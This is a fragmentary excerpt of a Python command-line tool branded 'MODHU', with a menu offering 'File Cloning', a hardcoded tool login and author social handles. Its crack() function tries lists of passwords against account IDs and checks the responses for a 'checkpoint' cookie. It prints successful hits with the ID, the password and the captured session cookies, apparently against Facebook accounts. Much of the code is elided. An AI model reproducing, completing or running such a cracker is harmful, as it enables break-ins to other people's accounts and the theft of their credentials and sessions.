...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mMODHU')
...
while attemps < 12345677901:
    ...
    if username == 'user' and password == 'MODHU12':
...
os.system('espeak -a 300 " Welcome,   to,  my,  Tools,  I, am, MODHU"')
...
\33[1;96m╔═════════════════════════════════════════╗
\033[93m ║ AUTHOR > \x1b[1;91mMD MODHU
\033[32m ║ FB > \x1b[1;97mMODHU
\033[95m ║ GITHUB > \x1b[0;34mMODHU-12
...
def login():
	#print(logo)
	banner()
	MODHUj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	MODHUj('\033[0;97m===============================================')
	MODHU= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if MODHU in ['m']:
		public()
	elif MODHU in ['1']:
		crack_file()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[MODHU-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#MODHU-
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•MODHU-Cp] {idf} • {pw}')     
				...
				#MODHU-
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•MODHU-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m══════════════════════════════════════════════╗')
